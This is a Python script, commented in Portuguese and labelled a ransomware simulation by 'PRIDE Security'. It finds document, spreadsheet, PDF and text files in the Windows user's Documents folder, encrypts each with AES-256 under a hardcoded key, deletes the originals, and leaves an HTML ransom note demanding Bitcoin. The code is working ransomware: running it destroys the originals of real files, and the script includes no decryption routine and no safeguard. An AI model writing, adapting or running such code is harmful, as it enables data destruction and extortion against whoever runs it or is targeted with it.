import os
from Crypto.Cipher import AES
from Crypto.Util.Padding import pad

# Caminho da pasta alvo no Windows (Documentos do usuário atual)
TARGET_DIR = os.path.join(os.environ["USERPROFILE"], "Documents")

# Chave AES-256 (32 bytes)
KEY = b"SuperSecureKey123456789012345678"

# Extensões de arquivos a criptografar
EXTENSIONS = [".txt", ".docx", ".xlsx", ".csv", ".pdf"]

# Extensão usada para arquivos criptografados
ENCRYPTED_EXTENSION = ".locked"

def print_banner():
    print("=== Simulação de Ransomware por PRIDE Security ===\n")

def encrypt_file(filepath):
    with open(filepath, 'rb') as f:
        data = f.read()

    iv = os.urandom(16)
    cipher = AES.new(KEY, AES.MODE_CBC, iv)
    encrypted_data = iv + cipher.encrypt(pad(data, AES.block_size))

    with open(filepath + ENCRYPTED_EXTENSION, 'wb') as f:
        f.write(encrypted_data)

    os.remove(filepath)

def find_and_encrypt_files():
    total = 0
    for root, _, files in os.walk(TARGET_DIR):
        for file in files:
            if any(file.endswith(ext) for ext in EXTENSIONS):
                full_path = os.path.join(root, file)
                encrypt_file(full_path)
                print(f"[+] Arquivo criptografado: {full_path}")
                total += 1
    return total

def drop_ransom_note():
    note = (
        "<html><body><h1 style='color:red;'>SEUS ARQUIVOS FORAM CRIPTOGRAFADOS</h1>"
        "<p>Esta é uma simulação feita pela PRIDE Security.</p>"
        "<p>Para recuperar seus dados, envie 100 Bitcoins para: 1HUMORn0FakeBTCAddr1234567</p>"
        "<p>Entre em contato: devolver@ransom.test</p>"
        "</body></html>"
    )
    note_path = os.path.join(TARGET_DIR, "README_RECOVER.html")
    with open(note_path, "w") as f:
        f.write(note)
    print(f"\n[!] Nota de resgate criada: {note_path}")

if __name__ == "__main__":
    print_banner()
    print("[*] Iniciando simulação de ransomware...\n")
    total = find_and_encrypt_files()
    drop_ransom_note()
    print(f"\n[✓] Total de arquivos criptografados: {total}")
    print("[✓] Fim da simulação.\n")

